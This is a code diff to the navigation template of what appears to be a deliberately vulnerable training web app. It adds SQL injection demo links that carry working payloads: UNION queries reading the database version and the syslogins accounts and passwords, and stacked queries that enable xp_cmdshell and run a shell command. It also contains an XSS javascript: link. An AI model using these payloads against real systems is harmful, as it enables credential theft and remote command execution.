@@ -39,6 +39,23 @@
                         <li><a class="nav-link" routerLink="/xss/<a href='javascript:alert(%22Uh oh... 😢%22)'>Breadcrumbs 2">Breadcrumbs 2</a></li>
                     </ul>
                 </section>
+
+                <!-- SQLi -->
+                <section class="nav-group">
+                    <input id="nav-xss" type="checkbox">
+                    <label for="nav-xss">SQL Injection</label>
+                    <ul class="nav-list">
+                        <li><a class="nav-link" routerLink="/sqli/easy">Easy</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' OR 1=1 --'}">Easy - 101</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' UNION SELECT @@VERSION,2,3,4,5,6 --'}">Easy - SQL Version</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\' UNION SELECT name,2,password,HOST_NAME(),5,DB_NAME() FROM master..syslogins --'}">Easy - Accounts</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC sp_configure \'show advanced options\', 1;--'}">Easy - Get Shell 1</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--'}">Easy - Get Shell 2</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC sp_configure \'xp_cmdshell\', 1;--'}">Easy - Get Shell 3</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--'}">Easy - Get Shell 4</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'whoami\';--'}">Easy - Shell</a></li>
+                    </ul>
+                </section>
             </section>
         </nav>
 
